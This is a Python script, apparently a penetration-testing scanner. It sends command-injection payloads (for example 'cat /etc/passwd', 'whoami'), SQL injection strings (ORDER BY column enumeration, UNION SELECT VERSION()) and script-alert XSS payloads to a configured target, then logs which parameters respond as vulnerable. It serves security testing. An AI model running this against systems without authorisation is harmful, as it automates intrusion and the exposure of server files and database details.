from config import *
import requests
import os
from datetime import datetime
import itertools
import re
import click
from classes.VulnerableResource import VulnerableResource
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.common.by import By
from webdriver_manager.chrome import ChromeDriverManager
from webdriver_manager.core.utils import ChromeType
from bs4 import BeautifulSoup
import random
import string

def generate_random_string(length):
    """
    it generates a random string containing numbers and letters.

    :param length: length of the string
    :return: random string
    """
    
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for i in range(length))

def is_resource_found(status_code, url):
    """
    it checks the status code of a response.

    :param status_code: status code of a response
    :param url: server resource
    :return: False if the status code is 404, True otherwise
    """
    
    if 404 == status_code:
        print(f'FILE NOT FOUND: {url}')                            
        return False

    return True

def print_debug_info(request, response, data):
    """
    it prints debug info.

    :param request: request details
    :param response: HTTP response
    :param data: dictionary containing data sent during the request
    """
    
    if DEBUG:
        print(f'\n[DEBUG] - URL: {request["url"][1:]}')
        print(f'[DEBUG] - HTTP METHOD: {request["method"]}')
        print(f'[DEBUG] - COMPLETE URL: {response.url}')
        print(f'[DEBUG] - PARAMETERS AND VALUES: {data}')
        
        print('[DEBUG] - RESPONSE')
        print(response.text)

def write_vulnerabilty_report(vulnerabilities_lines):
    """
    it writes text inside the output file. If the file and directories don't exist it creates them.

    :param vulnerabilities_lines: list of lines containing vulnerabilities to write inside the output file
    """

    directories, filename = os.path.split(VULNERABILITY_OUTPUT_PATH)

    if not os.path.exists(directories):
        os.makedirs(directories)

    with open(VULNERABILITY_OUTPUT_PATH, 'a+') as f:
        for message in vulnerabilities_lines:
            f.write(f'{message}\n')

def is_parameter_vulnerable(parameter_value, url_under_test, response):
    """
    it establishes if a parameter is: vulnerable, seems vulnerable or not vulnerable.

    :param parameter_value: value of the parameter under test
    :param url_under_test: server resource name
    :param response: HTTP response
    :return: enum with value: vulnerable, seems vulnerable or not vulnerable
    """
    
    if 'ls' in parameter_value:
        if url_under_test in response.text:
            return VulnerableResource.VULNERABLE
    
    if 'cat /etc/passwd' in parameter_value:
        if 'root' in response.text:
            return VulnerableResource.VULNERABLE
    
    if ('head' in parameter_value or 'grep php' in parameter_value) and '.php' in parameter_value:
        if '<?php' in response.text:
            return VulnerableResource.VULNERABLE
    
    if 'whoami' in parameter_value:
        if CURRENT_USER in response.text:
            return VulnerableResource.VULNERABLE
    
    if 'ifconfig | grep inet' in parameter_value:
        if 'inet' in response.text:
            return VulnerableResource.VULNERABLE
    
    # if the payload contais command to find the number of columns
    if re.findall('[\'"1] ORDER BY \d+ -- -', parameter_value):
        # response is empty if column number is out of range
        if not response.text and 500 == response.status_code:
            return VulnerableResource.SEEMS_VULNERABLE

    # xss injection
    if re.findall('<script>alert([\'"]?(.*)[\'"]?)</script>', parameter_value):    
        # if the response contains script string in the body    
        if parameter_value in response.text:
            return VulnerableResource.SEEMS_VULNERABLE

    return VulnerableResource.NOT_VULNERABLE

def read_requests_details(requests_file, requests_dict):
    """
    it reads the requests details file and saves data inside a dictionary.

    :param requests_file: input file containing the details
    :param requests_dict: dictionary containing the list of requests to be performed
    """
    
    with open(requests_file) as f:
        for line in f:
            values = line.strip().split(REQUESTS_SPLIT_VAL)

            requests_dict.append({ 
                'method':  values[0].upper(),
                'url': values[1],
                'parameters': values[2].split(REQUESTS_PARAMETERS_SPLIT_VAL),
            })

def read_payloads(payloads_file, requests_dict):
    """
    it reads the payloads file and saves data inside a dictionary.

    :param payloads_file: input file containing the payloads
    :param requests_dict: dictionary containing the list of requests to be performed
    :exception ValueError: if more payloads are specified and the payloads list contains the command to find the columns number
    :exception IndexError: if the length of the files is not the same
    """

    with open(payloads_file) as f:          
        i = 0

        for line in f:
            payloads = line.strip().split(PAYLOADS_SPLIT_VAL)

            # can't inject other payload with special commands
            if len(payloads) > 1 and (COMMAND_COLUMNS_NUMBER == payloads[0] or COMMAND_XSS_INJECTION == payloads[0]):
                print('Only one payload can be injected with special commands')
                raise ValueError()

            requests_dict[i]['payloads'] = payloads
            i += 1

        if i != len(requests_dict):
            raise IndexError()

def send_request(http_method, data, final_url):
    """
    it sends an HTTP request based on a specific HTTP method.

    :param http_method: HTTP metod
    :param data: data to be sent
    :param final_url: url containing target and resource
    :return: HTTP response
    :exception ValueError: if HTTP method is not supported
    """
    
    if 'GET' == http_method:
        return requests.get(final_url, params=data)
    
    if 'POST' == http_method:
        return requests.post(final_url, data=data)

    print(f'Method {http_method} is not supported. Check your input file')
    raise ValueError

def normalize_parameters(request):
    """
    it normalizes the parameters by adding valid values if missing.
    """
    
    # if at least one parameter hasn't a payload  
    if len(request['parameters']) > len(request['payloads']):
        for _ in range(len(request['parameters']) - len(request['payloads'])):
            request['payloads'].append('valid_string') # append a valid value for each parameter 

def prepare_data(request_parameters, payloads, custom_value=None):
    """
    it prepares data used in HTTP request.

    :param request_parameters: list of parameters to be sent
    :param payloads: list of payloads to inject
    :param custom_value: if set, a custom value is inserted for specific parameters
    :return: prepared data
    """
    
    data = { }
    
    for i in range(len(request_parameters)):
        if custom_value and (COMMAND_COLUMNS_NUMBER == payloads[i] or COMMAND_XSS_INJECTION == payloads[i]):
            data[request_parameters[i]] = custom_value
        else:
            data[request_parameters[i]] = payloads[i]

    return data

def send_confirmation_request(vulnerable_parameter, injected_payload, number_of_columns, request_details, payloads, pre_union_value, vulnerabilities_lines):
    """
    it sends an HTTP request in order to confirm if a query is vulnerable. If the vulnerability is confirmed a new line will be saved to be written inside the output file.
    
    :param vulnerable_parameter: vulnerable parameter to be confirmed
    :param injected_payload: vulnerable parameter payload
    :param number_of_columns: number of columns found by injecting the ORDER BY command
    :param request_details: details of the request
    :param payloads: payloads to inject
    :param pre_union_value: char to prepend to the UNION command
    :param vulnerabilities_lines: list of lines containing vulnerabilities to write inside the output file
    :return: true if at least one vulnerability is confirmed (based on permutations), false otherwise
    """

    columns_values = ['VERSION()']

    for _ in range(1, number_of_columns): # skip a column, first one is replaced by the version command
        columns_values.append('NULL') # NULL allows to avoid type errors

    if DEBUG:
        print('\n[DEBUG] - STARTING VULNERABILITY CONFIRMATION')
        print(f'[DEBUG] - HTTP METHOD: {request_details["method"]}')

    is_vulnerability_confirmed = False

    # use set to remove repetitions
    for column_value in set(itertools.permutations(columns_values, number_of_columns)):
        confirmation_query = 'UNION SELECT '

        for column_val in column_value:
            confirmation_query += f'{column_val}, '
    
        confirmation_query = confirmation_query[:-2] # remove extra chars

        confirmation_data = prepare_data(request_details['parameters'], payloads, f'{pre_union_value} {confirmation_query} -- -')
        response = send_request(request_details['method'], confirmation_data, TARGET + request_details['url'])
        
        if DEBUG:
            print(f'[DEBUG] - COMPLETE URL: {response.url}')
            print(f'[DEBUG] - PARAMETERS AND VALUES: {confirmation_data}')
            print('[DEBUG] - RESPONSE')
            print(response.text)

        if re.findall('\d.\d.[\d.]+', response.text): # if the response contains a version format string then the vulnerability is confirmed            
            is_vulnerability_confirmed = True

            message = f'Found a command injection for URL: {request_details["url"][1:]}, HTTP method: {request_details["method"]}, parameter: {vulnerable_parameter}, payload: {injected_payload}. The table has {number_of_columns} column(s)'
            
            print(message)
            vulnerabilities_lines.append(f'{datetime.now()} - {message}')

        if is_vulnerability_confirmed:
            break

    if DEBUG:
        print('[DEBUG] - VULNERABILITY CONFIRMATION FINISHED')
        
    return is_vulnerability_confirmed

def prepare_data_and_send_request(requests_dict, vulnerabilities_lines, run_mode):
    """
    it prepares data and send an HTTP request for cmd and sql mode.

    :param requests_dict: dictionary containing the list of requests to be performed
    :param vulnerabilities_lines: list of lines containing vulnerabilities to write inside the output file
    :param run_mode: run mode [cmd, sql, xss]
    """
    
    for request in requests_dict:
        final_url = TARGET + request['url']

        normalize_parameters(request)

        # set current ORDER BY value
        current_column_number = 1

        # used to prepend char in ORDER BY command
        pre_order_by_values = ['\'', '"', '1']

        random_string_length = 8
        random_string = generate_random_string(random_string_length)

        xss_injections = [
            f'<script>alert(\'{random_string}\');</script>',
            f'\'><script>alert(\'{random_string}\');</script>',
            f'"><script>alert(\'{random_string}\');</script>'
        ]

        noc_command_in_payloads = COMMAND_COLUMNS_NUMBER in request['payloads']

        # this loop allows permutation using incremental current_column_number value
        while True:
            end_loop = False

            # permutations of payloads based on parameters length
            for payload in set(itertools.permutations(request['payloads'], len(request['parameters']))):
                # if payload contains the command to find the number of columns and the run is set to sql mode 
                if noc_command_in_payloads and 'sql' == run_mode:
                    for pre_order_by_value in pre_order_by_values:
                        data = prepare_data(request['parameters'], payload, f'{pre_order_by_value} ORDER BY {current_column_number} -- -')
                        response = send_request(request['method'], data, final_url)

                        if not is_resource_found(response.status_code, request['url']):
                            end_loop = True
                            break

                        print_debug_info(request, response, data)

                        for i in range(len(request['parameters'])):
                            if COMMAND_COLUMNS_NUMBER != payload[i]:
                                continue

                            if is_parameter_vulnerable(data[request['parameters'][i]] , request['url'][1:], response) == VulnerableResource.SEEMS_VULNERABLE:
                                number_of_columns = int(re.findall('\d+', data[request['parameters'][i]])[-1])-1

                                # if 0, char before ORDER BY 1 is not valid for the type used in query 
                                if number_of_columns > 0:
                                    # confirmation needed
                                    end_loop = send_confirmation_request(request['parameters'][i], data[request['parameters'][i]], number_of_columns, request, payload, pre_order_by_value, vulnerabilities_lines)
                                    break
                elif 'GET' == request['method'] and COMMAND_XSS_INJECTION in request['payloads'] and 'xss' == run_mode:
                    for xss_injection in xss_injections:
                        data = prepare_data(request['parameters'], payload, xss_injection)
                        response = send_request(request['method'], data, final_url)

                        if not is_resource_found(response.status_code, request['url']):
                            break

                        print_debug_info(request, response, data)

                        alert_found = False

                        for i in range(len(request['parameters'])):
                            if COMMAND_XSS_INJECTION != payload[i]:
                                continue

                            if is_parameter_vulnerable(data[request['parameters'][i]], request['url'][1:], response) == VulnerableResource.SEEMS_VULNERABLE:
                                soup = BeautifulSoup(response.text, 'html.parser')

                                script_tags = soup.find_all('script')
                                
                                open_tag = '<script>'
                                open_tag_index = data[request['parameters'][i]].index(open_tag)
                                close_tag_index = data[request['parameters'][i]].index('</script>')

                                script_body = data[request['parameters'][i]][open_tag_index + len(open_tag) : close_tag_index]

                                unsafe_tag = None
                                unsafe_attr = None

                                # loop over script tags
                                for script_tag in script_tags:
                                    if script_body == script_tag.string:
                                        alert_found = True

                                        unsafe_tag = script_tag.parent

                                        # if vulnerability seems to be directly in body (no tag, no attribute, etc)
                                        if '[document]' == unsafe_tag.name:
                                            unsafe_tag = script_tag.previous_element

                                        # if the vulnerability is directly inside the body, unsafe_tag.name is None
                                        if unsafe_tag.name:
                                            # last attr is the injectable attr
                                            unsafe_attr = list(unsafe_tag.attrs)[-1]

                                        break

                                if alert_found:
                                    message = f'Found a xss injection for URL: {request["url"][1:]}, HTTP method: {request["method"]}, parameter: {request["parameters"][i]}, payload: {data[request["parameters"][i]]}'
                                    message += '. The injection was found '

                                    if unsafe_attr:
                                        message += f'inside the tag: {unsafe_tag.name}, attribute: {unsafe_attr}'
                                    else:
                                        message += 'directly inside the body'

                                    options = Options()
                                    options.add_experimental_option('detach', KEEP_BROWSER_OPEN)
                                    driver = webdriver.Chrome(service=Service(ChromeDriverManager(chrome_type=ChromeType.GOOGLE).install()), options=options)

                                    driver.get(response.url)

                                    alert_found = False

                                    parameter_alert_value = re.search('\((.*)\)', data[request['parameters'][i]]).group(0)

                                    # remove parenthesis
                                    parameter_alert_value = parameter_alert_value[1:-1]

                                    if parameter_alert_value.startswith('\'') or parameter_alert_value.startswith('"'):
                                        parameter_alert_value = parameter_alert_value[1:] # removing extra char

                                    if parameter_alert_value.endswith('\'') or parameter_alert_value.endswith('"'):
                                        parameter_alert_value = parameter_alert_value[:-1] # removing extra char

                                    # loop because other alerts may exist
                                    while True:                               
                                        try:
                                            WebDriverWait(driver, MAX_ALERT_WAITING_TIME).until(EC.alert_is_present())
                                            alert = driver.switch_to.alert

                                            # found text
                                            if alert.text == parameter_alert_value:
                                                print(message)
                                                vulnerabilities_lines.append(f'{datetime.now()} - {message}')
                                                
                                                alert_found = True

                                            # close popup
                                            alert.accept()

                                            if alert_found:
                                                break
                                        except TimeoutException:
                                            if DEBUG:
                                                print(f'[DEBUG] - ALERT NOT FOUND, PARAMETER VALUE: {data[request["parameters"][i]]}')

                                            break
                                    
                                    if not KEEP_BROWSER_OPEN:
                                        driver.quit()

                        if alert_found:
                            break
                else: # simply inject commands
                    data = prepare_data(request['parameters'], payload)                    
                    response = send_request(request['method'], data, final_url)

                    if not is_resource_found(response.status_code, request['url']):
                        break

                    print_debug_info(request, response, data)
                
                    for i in range(len(request['parameters'])):                        
                        if is_parameter_vulnerable(data[request['parameters'][i]], request['url'][1:], response)  == VulnerableResource.VULNERABLE:
                            message = f'Found a command injection for URL: {request["url"][1:]}, HTTP method: {request["method"]}, parameter: {request["parameters"][i]}, payload: {data[request["parameters"][i]]}'
            
                            print(message)
                            vulnerabilities_lines.append(f'{datetime.now()} - {message}')
                        
            # found and confirmed number of columns
            if end_loop or not noc_command_in_payloads:
                break

            current_column_number += 1

@click.command()
@click.option('--mode', '-m', help='Injection mode [sql, cmd, xss]', type=click.Choice(['sql', 'cmd', 'xss']), required=True)
@click.option('--irequests', '-r', help='Requests details file', required=True)
@click.option('--ipayloads', '-p', help='Payloads file', required=True)
def main(mode, irequests, ipayloads):
    if DEBUG:
        print(f'[DEBUG] - RUN MODE: {mode}')

    requests_dict = [ ]

    try:
        read_requests_details(irequests, requests_dict)
        read_payloads(ipayloads, requests_dict)
    
        if DEBUG:
            print('[DEBUG] - REQUESTS DICTIONARY')
            print(requests_dict)

        vulnerabilities_lines = [ ]

        prepare_data_and_send_request(requests_dict, vulnerabilities_lines, mode)
        write_vulnerabilty_report(vulnerabilities_lines)
    except ValueError:
        exit()
    except IndexError:
        print('Error: mismatching rows number between requests details and payloads files')
        exit()
    except FileNotFoundError:
        print('Error: file not found. Check command-line options')

if __name__ == '__main__':
    main()